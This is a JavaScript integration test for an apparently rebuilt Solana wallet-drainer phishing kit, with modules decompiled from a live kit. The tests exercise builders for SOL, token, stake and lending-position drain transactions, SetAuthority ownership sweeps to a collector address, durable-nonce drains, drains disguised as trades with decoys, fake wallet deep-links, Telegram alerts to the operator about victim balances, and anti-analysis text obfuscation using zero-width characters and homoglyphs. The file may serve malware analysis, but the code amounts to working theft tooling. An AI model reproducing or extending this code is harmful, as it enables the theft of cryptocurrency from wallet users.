'use strict';
/**
 * Full integration test for the rebuilt kit.
 * Run: node test.js
 */

const path  = require('path');
const fs    = require('fs');

const crypto_m   = require('./core/crypto');
const state_m    = require('./core/state');
const iocs_m     = require('./config/constants');
const config_m   = require('./core/config_parser');
const payloads_m = require('./operator/payloads');
const telem_m    = require('./operator/telemetry');
const params_m   = require('./page/params');
const telegram_m = require('./page/telegram');
const device_m   = require('./page/device');
const siws_m     = require('./page/siws');
const wdl_m      = require('./page/wallet_deeplinks');

let pass = 0, fail = 0;
function ok(label, cond, extra) {
  if (cond) { console.log('  PASS  ' + label); pass++; }
  else { console.log('  FAIL  ' + label + (extra ? '  → ' + extra : '')); fail++; }
}

async function main() {

  // ── 1. CRYPTO ─────────────────────────────────────────────────────────
  console.log('\n=== CRYPTO ===');
  const { base58Encode, base58Decode, baseXEncode, baseXDecode,
          SLUG_ALPHABET, crc32, writeU32, writeU64, writePubkey,
          packByteArrays, aesEncrypt, aesDecrypt } = crypto_m;

  // base58 round-trip on treasury address
  const treasury = iocs_m.TREASURY;
  const decoded  = base58Decode(treasury);
  ok('base58 decode length',  decoded.length === 32);
  ok('base58 round-trip',     base58Encode(decoded) === treasury, base58Encode(decoded));

  // base-X: live verified slug
  const slug = baseXEncode(new TextEncoder().encode('pumpanakin.fun'), SLUG_ALPHABET);
  ok('baseX slug known value', slug === 'rvl-7raj_dhlbkx5c4dqrf', slug);
  const back = new TextDecoder().decode(baseXDecode(slug, SLUG_ALPHABET));
  ok('baseX round-trip',      back === 'pumpanakin.fun', back);

  // CRC32 — known test vector: crc32('abc') = 0x352441C2
  const crcVal = crc32(new TextEncoder().encode('abc'));
  ok('crc32 test vector',     crcVal === 0x352441C2, '0x' + crcVal.toString(16));

  // packByteArrays
  const packed = packByteArrays([new Uint8Array([1,2]), new Uint8Array([3,4,5])]);
  ok('packByteArrays count',  packed[0] === 2);
  ok('packByteArrays item1 u16', packed[1] === 2 && packed[2] === 0); // u16 LE = 2
  ok('packByteArrays item2 u16', packed[5] === 3 && packed[6] === 0); // u16 LE = 3
  ok('packByteArrays bytes',  packed[3] === 1 && packed[4] === 2 && packed[7] === 3);

  // AES-GCM round-trip
  if (typeof globalThis.crypto !== 'undefined') {
    const plain = new TextEncoder().encode('hexfomo.fun test');
    const enc   = await aesEncrypt(plain, 'pumpanakin.fun');
    ok('aes enc length',      enc.length === 12 + plain.length + 16);
    const dec = await aesDecrypt(enc, 'pumpanakin.fun');
    ok('aes decrypt round-trip', new TextDecoder().decode(dec) === 'hexfomo.fun test');

    // Decrypt the actual live config
    const configPath = path.join(__dirname, '../decompiled/live/api_config.ciphertext.bin');
    if (fs.existsSync(configPath)) {
      const ciphertext = new Uint8Array(fs.readFileSync(configPath));
      try {
        const pt = await aesDecrypt(ciphertext, 'pumpanakin.fun');
        ok('aes decrypt live config', pt.length === 160, pt.length);
      } catch(e) { ok('aes decrypt live config', false, e.message.slice(0,60)); }
    }
  } else {
    console.log('  SKIP  AES (no SubtleCrypto in this env)');
  }

  // ── 2. CONFIG PARSER ──────────────────────────────────────────────────
  console.log('\n=== CONFIG PARSER ===');
  const { parseConfig, parseDefaultConfig, shouldRedirectRu } = config_m;

  const plaintextPath = path.join(__dirname, '../decompiled/live/api_config.plaintext.bin');
  if (fs.existsSync(plaintextPath)) {
    const raw = new Uint8Array(fs.readFileSync(plaintextPath));
    const cfg = parseConfig(raw);
    ok('tokenMint = USDC',      cfg.tokenMint === 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v', cfg.tokenMint);
    ok('receiver address',      cfg.receiver  === '7VHUFJHWu2CuExkJcJrzhQPJ2oygupTWkL2A2For4BmE', cfg.receiver);
    ok('relay address',         cfg.relay     === '3emsAVdmGKERbHjmGfQ6oZ1e35dkf5iYcS6U4CPKFVaa', cfg.relay);
    ok('maxSol = 500',          cfg.maxSol    === 500.0, String(cfg.maxSol));
    ok('minSol = 1.0',          cfg.minSol    === 1.0,   String(cfg.minSol));
    ok('siblingDomain',         cfg.siblingDomain === 'trongame.fun', cfg.siblingDomain);
    ok('no RU redirect',        !shouldRedirectRu(cfg));
  } else {
    console.log('  SKIP  config parser (binary not found)');
  }

  // Default config parses
  try {
    const def = parseDefaultConfig();
    ok('default config parses', def.pubkeyCount === 3, String(def.pubkeyCount));
  } catch(e) { ok('default config parses', false, e.message); }

  // ── 3. PAYLOAD BUILDERS ───────────────────────────────────────────────
  console.log('\n=== PAYLOAD BUILDERS ===');
  const { buildConnectPayload, buildProcessPayload, encodeAccounts } = payloads_m;

  const victimKey = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
  const lamports  = BigInt(500_000_000_000);
  const accounts  = [{ type: 0, J: false, q: iocs_m.USDC_MINT, de: victimKey }];

  // connect payload
  const connPayload = buildConnectPayload(victimKey, lamports, accounts);
  ok('connect payload >= 59',  connPayload.length >= 59, String(connPayload.length));
  // verify CRC32 at end
  const body   = connPayload.slice(0, -4);
  const crcEnd = connPayload.slice(-4);
  const gotCrc = crcEnd[0] | (crcEnd[1]<<8) | (crcEnd[2]<<16) | (crcEnd[3]<<24);
  ok('connect CRC32 valid',    (gotCrc >>> 0) === crc32(body),
    '0x' + (gotCrc>>>0).toString(16) + ' vs 0x' + crc32(body).toString(16));
  // first 15 bytes = random nonce (all should be in 0-255 range, just check length)
  ok('connect nonce 15 bytes', connPayload.length === 59 + encodeAccounts(accounts).length,
    String(connPayload.length));

  // process payload
  const signedTx  = new Uint8Array([0xAA, 0xBB, 0xCC]);
  const procPayload = buildProcessPayload(victimKey, 7, [signedTx], 0, [victimKey]);
  ok('process payload >= 52',  procPayload.length >= 52, String(procPayload.length));
  // attempt counter at bytes 13-16
  const counter = procPayload[13] | (procPayload[14]<<8) | (procPayload[15]<<16) | (procPayload[16]<<24);
  ok('attempt counter = 7',    counter === 7, String(counter));
  // flow byte at offset 49
  ok('flow byte = 0',          procPayload[49] === 0);

  // ── 4. TELEMETRY BINARY ───────────────────────────────────────────────
  console.log('\n=== TELEMETRY BINARY ===');
  const { buildHandlerRecord, EVENT_KIND: EK } = telem_m;

  const rec = buildHandlerRecord({
    kind:    EK.CONNECT,
    version: '1.18.4',
    wallet:  'Phantom',
    pubkey:  base58Decode(iocs_m.TREASURY),
    Ge:      0,
    ve:      2.0,
    Me:      [iocs_m.USDC_MINT],
    Mr:      178.5,
    ie:      false,
    ut:      false,
    un:      'en-US',
    tg:      { id: BigInt(123456789), Pr: 'alice' },
  });
  ok('handler record > 50b',   rec.length > 50, String(rec.length));
  ok('event kind byte',        rec[0] === EK.CONNECT, String(rec[0]) + ' vs ' + EK.CONNECT);
  const vlen = rec[1];
  const ver  = new TextDecoder().decode(rec.slice(2, 2 + vlen));
  ok('version = 1.18.4',       ver === '1.18.4', ver);
  // tg present flag
  const tgFlag = rec[2 + vlen + 4];
  ok('tg_present flag = 1',    tgFlag === 1, String(tgFlag));

  // ── 5. PARAMS / SLUG ─────────────────────────────────────────────────
  console.log('\n=== PARAMS / CONNECT URL ===');
  const { generateConnectToken, readConnectToken, buildConnectUrl, encodeToSlug, decodeFromSlug } = params_m;

  const tok  = generateConnectToken('pumpanakin.fun');
  ok('connect token known',    tok === 'rvl-7raj_dhlbkx5c4dqrf', tok);
  ok('connect token decode',   readConnectToken(tok) === 'pumpanakin.fun');

  // Build connect URL
  const url = buildConnectUrl('petramon.xyz', 'pumpanakin.fun', null, {});
  ok('connect URL base',       url.startsWith('https://petramon.xyz/connect/'), url.slice(0,50));
  ok('connect URL b=1',        url.includes('?b=1'), url);

  // With tgUser
  const urlTg = buildConnectUrl('petramon.xyz', 'pumpanakin.fun',
    { tgid: 123, tgus: 'alice' }, {});
  ok('connect URL cd= param',  urlTg.includes('&cd='), urlTg);
  // Decode it back
  const cdSlug = urlTg.match(/&cd=([^&]+)/)?.[1];
  const cdDecoded = cdSlug ? decodeFromSlug(cdSlug) : '';
  ok('cd= decodes tgid-tgus',  cdDecoded === '123-alice', cdDecoded);

  // With overrides
  const urlOv = buildConnectUrl('petramon.xyz', 'pumpanakin.fun', null, { maxSol: 100 });
  ok('connect URL o= param',   urlOv.includes('&o='), urlOv);
  const oSlug   = urlOv.match(/&o=([^&]+)/)?.[1];
  const oDecoded = oSlug ? JSON.parse(decodeFromSlug(oSlug)) : {};
  ok('o= decodes overrides',   oDecoded.maxSol === 100, JSON.stringify(oDecoded));

  // ── 6. SIWS ──────────────────────────────────────────────────────────
  console.log('\n=== SIWS ===');
  const { buildSiwsMessage } = siws_m;
  const siwsMsg = buildSiwsMessage('pumpanakin.fun', 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v');
  ok('SIWS starts with host',  siwsMsg.startsWith('pumpanakin.fun'), siwsMsg.slice(0,30));
  ok('SIWS contains wants',    siwsMsg.includes('wants you to sign in'));
  ok('SIWS contains URI',      siwsMsg.includes('URI: https://pumpanakin.fun/login'));
  ok('SIWS contains Nonce',    siwsMsg.includes('Nonce: '));
  const nonce = siwsMsg.match(/Nonce: ([0-9a-f]+)/)?.[1];
  ok('SIWS nonce 16 hex',      nonce && nonce.length === 16, nonce);

  // ── 7. WALLET DEEP-LINKS ─────────────────────────────────────────────
  console.log('\n=== WALLET DEEP-LINKS ===');
  const { WALLETS, buildDeepLink } = wdl_m;
  ok('wallet count',           WALLETS.length === 26, String(WALLETS.length));
  const realWallets = WALLETS.filter(w => !w.fake);
  const fakeWallets = WALLETS.filter(w => w.fake);
  ok('real wallets = 20',      realWallets.length === 20, String(realWallets.length));
  ok('fake wallets = 6',       fakeWallets.length === 6,  String(fakeWallets.length));
  const connectTarget = 'https://petramon.xyz/connect/rvl-7raj_dhlbkx5c4dqrf?b=1';
  const solflare = WALLETS.find(w => w.name === 'Solflare');
  const sfLink   = buildDeepLink(solflare, connectTarget);
  ok('Solflare deeplink',      sfLink.startsWith('solflare://ul/v1/'), sfLink.slice(0,40));
  const phantom = WALLETS.find(w => w.name === 'Phantom');
  const phLink  = buildDeepLink(phantom, connectTarget);
  ok('Phantom deeplink',       phLink.startsWith('phantom://'), phLink.slice(0,30));

  // ── 8. DEVICE DETECTION ──────────────────────────────────────────────
  console.log('\n=== DEVICE DETECTION ===');
  const { getDeviceType, isMobileDevice, UA } = device_m;
  ok('UA is string',           typeof UA === 'string');
  const devType = getDeviceType();
  ok('devType 0-5',            devType >= 0 && devType <= 5, String(devType));
  ok('isMobileDevice fn',      typeof isMobileDevice === 'function');

  // ── 9. STATE ─────────────────────────────────────────────────────────
  console.log('\n=== STATE MACHINE ===');
  const { createSession, FLOW, ERR } = state_m;
  const sess = createSession('pumpanakin.fun');
  ok('session created',        sess.c.Se === 'pumpanakin.fun');
  ok('session K = 0',          sess.K === 0);
  ok('session he = null',      sess.he === null);
  ok('FLOW.DRAIN = 0',         FLOW.DRAIN === 0);
  ok('FLOW.SIWS = 1',          FLOW.SIWS  === 1);
  ok('FLOW.SPAM = 2',          FLOW.SPAM  === 2);
  ok('ERR.TOPUP_PREFIX',       ERR.TOPUP_PREFIX.includes('least'));
  ok('ERR.REVERTED',           ERR.REVERTED.includes('reverted'));

  // ── 10. TX BUILDERS ──────────────────────────────────────────────────
  console.log('\n=== TX BUILDERS ===');
  const { computeUnitLimit, computeUnitPrice, markerInstruction,
          tokenDrainInstruction, solDrainInstruction, stakeWithdrawInstruction,
          assembleDummyTxs } = require('./chain/tx_builders');

  const cuLim = computeUnitLimit(200000);
  ok('computeUnitLimit disc',  cuLim.data[0] === 2);
  ok('computeUnitLimit units', (cuLim.data[1] | cuLim.data[2]<<8 | cuLim.data[3]<<16 | cuLim.data[4]<<24) === 200000);

  const marker = markerInstruction('1kd1mz4r-|1|');
  ok('marker program',         marker.program === iocs_m.OPERATOR_PROGRAM);
  ok('marker ASCII tag',       new TextDecoder().decode(marker.data) === '1kd1mz4r-|1|');

  const drain = solDrainInstruction(victimKey, iocs_m.RECEIVER_A, iocs_m.COLLECTOR, 0x50);
  ok('SOL drain disc 0x15',    drain.data[0] === 0x15, '0x' + drain.data[0].toString(16));
  ok('SOL drain arg 0x02',     drain.data[1] === 0x02);
  ok('SOL drain pct 0x50',     drain.data[2] === 0x50);
  ok('SOL drain 4 accounts',   drain.accounts.length === 4);

  const dummyTxs = assembleDummyTxs(victimKey, 50);
  ok('dummy txs count',        dummyTxs.length === 50, String(dummyTxs.length));

  // stake withdraw
  const stakeIx = stakeWithdrawInstruction('3prL5bxry2iu5HF6JP1BLNoFtNv5AN8XYrcsJk2TRo39', victimKey, iocs_m.TREASURY, 1_000_000_000);
  ok('stake withdraw disc',    stakeIx.data[0] === 4 && stakeIx.data[1] === 0);
  ok('stake 5 accounts',       stakeIx.accounts.length === 5);

  // ── 11. DURABLE NONCE ────────────────────────────────────────────────
  console.log('\n=== DURABLE NONCE ===');
  const { advanceNonceInstruction, buildDurableNonceDrainTx } = require('./chain/durable_nonce');
  const fakeNonce = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
  const advIx = advanceNonceInstruction(fakeNonce, fakeNonce);
  ok('advance nonce disc = 4', advIx.data[0] === 4 && advIx.data[1] === 0 && advIx.data[2] === 0 && advIx.data[3] === 0);
  ok('advance nonce program', advIx.program === '11111111111111111111111111111111');
  ok('advance nonce 3 accts', advIx.accounts.length === 3);

  const durableTx = buildDurableNonceDrainTx(fakeNonce, fakeNonce, [advanceNonceInstruction(fakeNonce, fakeNonce)]);
  ok('durable tx ix count',   durableTx.length === 2);
  ok('durable tx first=advance', durableTx[0].data[0] === 4);

  // ── 12. TELEGRAM NOTIFY ───────────────────────────────────────────────
  console.log('\n=== TELEGRAM NOTIFY ===');
  const { STEP, buildNotifyMessage } = require('./operator/telegram_notify');
  const notifyCtx = {
    customerId: '1kd1mz4r-',
    wallet:     'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v',
    solBalance: 2.5,
    tokens:     [{ symbol: 'USDC', usd: 500 }, { symbol: 'SOL', usd: 448 }],
    totalUsd:   948,
  };
  const msg = buildNotifyMessage(STEP.SIGN, notifyCtx);
  ok('notify message has step',     msg.includes(STEP.SIGN));
  ok('notify message has customer', msg.includes('1kd1mz4r-'));
  ok('notify message has wallet',   msg.includes('EPjFWdd5'));
  ok('notify message has balance',  msg.includes('2.500 SOL'));

  // ── 13. VICTIM PERSONALIZATION ────────────────────────────────────────
  console.log('\n=== VICTIM PERSONALIZATION ===');
  const { computeAllocatedReward, computeRiskScore, buildEligibilityMessage } = require('./page/victim_personalization');
  const reward = computeAllocatedReward(10.0, 180);
  ok('reward sol = 90%',      reward.sol === 9.0, String(reward.sol));
  ok('reward usd > 0',        reward.usd > 0, String(reward.usd));

  const fakePortfolio = { tokens: [{ usd: 5000, token2022: true }, { usd: 3000, token2022: false }], solLamports: 5e9, solPriceUsd: 180 };
  const score = computeRiskScore(fakePortfolio);
  ok('risk score 0-1',        score >= 0 && score <= 1, String(score));
  ok('high value = high score', score >= 0.7, String(score));

  const eligMsg = buildEligibilityMessage(10.0, 5, 2300);
  ok('eligibility msg has sol', eligMsg.includes('SOL'));
  ok('eligibility msg has %',   eligMsg.includes('9.00') || eligMsg.includes('SOL'));

  // ── 14. DOM ANTI-ANALYSIS ─────────────────────────────────────────────
  console.log('\n=== DOM ANTI-ANALYSIS ===');
  const { insertZeroWidths, stripZeroWidths, applyCyrillicHomoglyphs, HOMOGLYPH_MAP } = require('./page/dom_antianalysis');
  const original = 'claim reward';
  const withZW   = insertZeroWidths(original, 1.0); // force all positions
  ok('zero-width inserted',    withZW.length > original.length, String(withZW.length));
  ok('strip zero-widths',      stripZeroWidths(withZW) === original, stripZeroWidths(withZW));

  const withHom = applyCyrillicHomoglyphs('contract', 1.0); // force all
  ok('homoglyphs applied',     withHom !== 'contract', withHom);
  ok('looks same length',      withHom.length === 'contract'.length);
  // Check a Cyrillic char is in there
  ok('contains Cyrillic',      /[\u0400-\u04FF]/.test(withHom));

  // ── 15. ON-CHAIN CONFIG ────────────────────────────────────────────────
  console.log('\n=== ON-CHAIN CONFIG ===');
  const { proxyUrl } = require('./core/onchain_config');
  const proxied = proxyUrl('pumpanakin.fun', '/api/config');
  ok('proxy URL format',       proxied.startsWith('https://pumpanakin.fun/api/'), proxied);
  ok('proxy URL has path',     proxied.length > 'https://pumpanakin.fun/api/'.length);

  // AES decrypt round-trip via onchain style (re-encrypt then decrypt)
  if (typeof globalThis.crypto !== 'undefined') {
    const { decryptOnchainConfig } = require('./core/onchain_config');
    const { aesEncrypt } = require('./core/crypto');
    const testPlain = new TextEncoder().encode('onchain config test');
    // Encrypt with victim-key style
    const { subtle } = globalThis.crypto;
    const encoded = new TextEncoder().encode('victim123' + 'testsalt');
    const digest  = await subtle.digest('SHA-256', encoded);
    const key     = await subtle.importKey('raw', digest, { name: 'AES-GCM' }, false, ['encrypt', 'decrypt']);
    const iv      = new Uint8Array(12);
    const ct      = await subtle.encrypt({ name: 'AES-GCM', iv }, key, testPlain);
    const blob    = new Uint8Array(12 + ct.byteLength);
    blob.set(iv, 0);
    blob.set(new Uint8Array(ct), 12);

    const decrypted = await decryptOnchainConfig(blob, 'victim123', 'testsalt');
    ok('onchain decrypt round-trip', new TextDecoder().decode(decrypted) === 'onchain config test');
  }

  // ── 16. LENDING POSITION DRAIN ────────────────────────────────────────
  console.log('\n=== LENDING ===');
  const { isKaminoToken, buildKaminoWithdrawInstruction, buildMarginfiWithdrawInstruction,
          KAMINO_KLEND_PROGRAM, MARGINFI_PROGRAM } = require('./chain/lending');

  ok('kToken detected',        isKaminoToken({ symbol: 'kSOL', decimals: 9 }));
  ok('kUSDC detected',         isKaminoToken({ symbol: 'kUSDC', decimals: 6 }));
  ok('regular token rejected', !isKaminoToken({ symbol: 'USDC', decimals: 6 }));

  const kaminoIx = buildKaminoWithdrawInstruction({
    victimAuthority: victimKey, obligation: victimKey, lendingMarket: victimKey,
    marketAuthority: victimKey, reserve: victimKey, liquidityMint: victimKey,
    reserveSupplyVault: victimKey, reserveCollateralMint: victimKey,
    kTokenSource: victimKey, underlyingDest: victimKey,
  }, 1_000_000);
  ok('kamino program',         kaminoIx.program === KAMINO_KLEND_PROGRAM);
  ok('kamino disc b712',       kaminoIx.data[0] === 0xb7 && kaminoIx.data[1] === 0x12);
  ok('kamino amount u64',      kaminoIx.data[8] === 0x40 && kaminoIx.data[9] === 0x42 && kaminoIx.data[10] === 0x0f);
  ok('kamino 13 accounts',     kaminoIx.accounts.length === 13);

  const marginfiIx = buildMarginfiWithdrawInstruction({
    group: victimKey, marginfiAccount: victimKey, victimAuthority: victimKey,
    bank: victimKey, destinationToken: victimKey,
    bankLiquidityVaultAuth: victimKey, bankLiquidityVault: victimKey,
  }, 500_000);
  ok('marginfi program',       marginfiIx.program === MARGINFI_PROGRAM);
  ok('marginfi disc 2479',     marginfiIx.data[0] === 0x24 && marginfiIx.data[1] === 0x79);
  ok('marginfi 9 accounts',    marginfiIx.accounts.length === 9);

  // ── 17. JITO WRAP / DISGUISE ──────────────────────────────────────────
  console.log('\n=== JITO WRAP ===');
  const { buildJitoTip, randomizedComputeBudget, interleaveDecoys, wrapDrainAsTrade,
          JITO_TIP_ACCOUNTS } = require('./chain/jito_wrap');

  const tip = buildJitoTip(victimKey, 100_000);
  ok('jito tip disc 2',        tip.data[0] === 2);
  ok('jito tip account valid', JITO_TIP_ACCOUNTS.includes(tip.accounts[1].pubkey));

  const cu1 = randomizedComputeBudget(100000);
  const cuVal = cu1.data[1] | cu1.data[2]<<8 | cu1.data[3]<<16 | cu1.data[4]<<24;
  ok('CU jitter ±5%',          cuVal >= 95000 && cuVal <= 105000, String(cuVal));

  const sweeps = [1,2,3].map(i => ({ tag: 'sweep' + i }));
  const decoys = [1,2].map(i => ({ tag: 'decoy' + i }));
  const mixed  = interleaveDecoys(sweeps, decoys);
  ok('interleaved count',      mixed.length === 5);
  ok('interleaved order',      mixed[0].tag === 'sweep1' && mixed[1].tag === 'decoy1');

  const wrapped = wrapDrainAsTrade(victimKey, mixed, [], {});
  ok('wrapped has tip',        wrapped[wrapped.length-1].data[0] === 2);
  ok('wrapped first is CU',    wrapped[0].data[0] === 2 || wrapped[0].data[0] === 3);

  // ── 18. SETAUTHORITY ─────────────────────────────────────────────────
  console.log('\n=== SETAUTHORITY ===');
  const { AUTH_TYPE, buildSetAuthorityInstruction, buildSetAuthoritySweep } = require('./chain/setauthority');

  const setAuthIx = buildSetAuthorityInstruction(victimKey, victimKey, AUTH_TYPE.ACCOUNT_OWNER, iocs_m.COLLECTOR);
  ok('setauth disc 6',         setAuthIx.data[0] === 6);
  ok('setauth type owner',     setAuthIx.data[1] === 2);
  ok('setauth has new auth',   setAuthIx.data[2] === 1);
  ok('setauth 2 accounts',     setAuthIx.accounts.length === 2);

  const sweep = buildSetAuthoritySweep([victimKey, iocs_m.RECEIVER_A], victimKey, iocs_m.COLLECTOR);
  ok('sweep per account',      sweep.length === 2);
  ok('sweep uses ACCOUNT_OWNER', sweep.every(ix => ix.data[1] === 2));

  // ── 19. SPONSOR ───────────────────────────────────────────────────────
  console.log('\n=== SPONSOR ===');
  const { shouldSponsor, sponsoredGate } = require('./chain/sponsor');

  ok('sponsor low SOL + value',     shouldSponsor(0, 500, 600_000_000));
  ok('no sponsor if funded',       !shouldSponsor(1e9, 500, 600_000_000));
  ok('no sponsor if no value',     !shouldSponsor(0, 0, 600_000_000));

  const gateEmpty = sponsoredGate({ lamports: 0, pubkey: victimKey }, { tokens: [] }, { minSol: 0.6 });
  ok('reject empty wallet',      gateEmpty.action === 'reject');

  const gateZero = sponsoredGate({ lamports: 0, pubkey: victimKey }, { tokens: [{ usd: 500 }] }, { minSol: 0.6, treasury: iocs_m.TREASURY });
  ok('sponsor zero-balance',     gateZero.action === 'sponsored');
  ok('sponsor feePayer=treasury', gateZero.feePayer === iocs_m.TREASURY);

  const gateFunded = sponsoredGate({ lamports: 2e9, pubkey: victimKey }, { tokens: [{ usd: 500 }] }, { minSol: 0.6 });
  ok('normal funded wallet',     gateFunded.action === 'normal');
  ok('normal feePayer=victim',   gateFunded.feePayer === victimKey);

  console.log('\n════════════════════════════════════════');
  console.log('  PASSED: ' + pass);
  console.log('  FAILED: ' + fail);
  console.log('  TOTAL:  ' + (pass + fail));
  if (fail === 0) console.log('  ✓ ALL TESTS PASS');
  else console.log('  ✗ ' + fail + ' FAILURES');
  console.log('════════════════════════════════════════');
}

main().catch(e => { console.error('FATAL:', e.message); console.error(e.stack); process.exit(1); });
